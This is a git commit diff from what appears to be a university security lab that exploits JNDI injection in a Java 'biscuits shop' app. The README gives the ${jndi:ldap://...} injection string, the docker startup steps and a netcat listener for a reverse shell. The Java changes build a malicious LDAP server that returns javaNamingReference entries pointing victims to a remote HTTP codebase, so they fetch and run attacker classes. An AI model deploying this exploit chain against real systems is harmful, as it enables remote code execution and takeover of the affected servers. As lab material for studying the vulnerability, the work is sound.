c303efe7acf2cea4ecba92a52e93983ba75cf39c
gordon <swissarthurfreeman@gmail.com>
2024-05-06 15:09:22 +0200

    feat(spring4Shell): Working RCE reverse shell

--- README.md
+++ README.md
@@ -1,8 +1,25 @@
+## Starting up the exploit
+
+Run, in this order, the following commands : 
+
+```bash
+docker compose up -d database       # wait for the database to spinup
+docker compose up application       # before launching application.
+docker compose up snoopy-http-server
+docker compose up snoopy-ldap-server
+```
+
+Connect to `http://localhost:8080` to access the biscuits shop frontend. 
+
 Do the RCE via `${jndi:ldap://snoopy-ldap-server:1389/a}` 
 Connect database container from shell via `mysql -h 127.0.0.1 -P 3306 -u root -p biscuits`
 Query the spring LDAP authentication server via `ldapsearch -x -D "uid=ben,ou=people,dc=unige,dc=ch" -W -H ldap://0.0.0.0:8389 -b "ou=people,dc=unige,dc=ch" -s sub "uid=*"`
 Query the malicious LDAP server via `ldapsearch -H ldap://0.0.0.0:1389 -b "dc=example,dc=com" -s sub -x "(objectclass=*)"`
 Access the malicious http server at `http://localhost:8000`
+
+### Remote Shell Exploit
+
+Startup a netcat server to listen for an incoming TCP remote shell connection `docker run -it snoopy-netcat-listener -lvnp 9001`.
 
 Dependencies : 
 
--- snoopy-ldap-server/src/main/java/ch/unige/ldap/MaliciousLDAPServer.java
+++ snoopy-ldap-server/src/main/java/ch/unige/ldap/MaliciousLDAPServer.java
@@ -2,19 +2,21 @@ package ch.unige.ldap;
 
 import java.net.URL;
 import java.net.InetAddress;
-
-import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
-import javax.net.ssl.SSLSocketFactory;
 
+import com.unboundid.ldap.sdk.Attribute;
+import com.unboundid.ldap.sdk.Entry;
+import javax.net.ServerSocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.NotNull;
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchRequest;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
-import com.unboundid.ldap.sdk.Entry;
-import com.unboundid.ldap.sdk.LDAPResult;
-import com.unboundid.ldap.sdk.ResultCode;
 
 /**
  * LDAP server implementation returning JNDI references
@@ -44,7 +46,7 @@ public class MaliciousLDAPServer {
                     (SSLSocketFactory) SSLSocketFactory.getDefault())
             );
 
-            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL("http://" + HTTP_SERVER_IP + "/Exploit.class")));
+            config.addInMemoryOperationInterceptor(new OperationInterceptor());
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
             System.out.println("Listening on 0.0.0.0:" + this.LDAP_PORT); //$NON-NLS-1$
             ds.startListening();
@@ -61,24 +63,26 @@ public class MaliciousLDAPServer {
      * LDAP queries. 
      */
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
-        private URL codebase;                   // url of the HTTP server that hosts the malicious .class file, http://HTTP_SERVER_IP#Exploit
-        public OperationInterceptor(URL cb) { this.codebase = cb; }
+        private URL codebase;                   // url of the HTTP server qthat hosts the malicious .class file, http://HTTP_SERVER_IP#Exploit
+        public OperationInterceptor() {}
 
-        /**
-         * {@inheritDoc}
-         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
-         */
+        public void processSearchRequest(InMemoryInterceptedSearchRequest request) {
+            System.out.println("BASE DN processSearchRequest :" + request.getRequest().getBaseDN());
+        }
+
+        /** {@inheritDoc} */
         @Override
         public void processSearchResult(InMemoryInterceptedSearchResult result) {
             String base = result.getRequest().getBaseDN();
             Entry e = new Entry(base);                                                                  // create new entry with dn
+
             try {                                                                       
-                System.out.println("Send LDAP reference result for " + base + " with java object entry at " + codebase.toString());
+                System.out.println("Send LDAP reference result for " + base + " java object.");
     
                 e.addAttribute("javaClassName", "foo");                       // entry is a Java Class, with name Exploit
                 e.addAttribute("javaCodeBase", "http://snoopy-http-server:8000/");                    // java code is hosted at http://http_server_ip:web_port/Exploit.class
                 e.addAttribute("objectClass", "javaNamingReference");                      
-                e.addAttribute("javaFactory", "Exploit");                     // name of malicious class : Exploit
+                e.addAttribute("javaFactory", base);                     // name of malicious class : Exploit
                 result.sendSearchEntry(e);
                 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
     
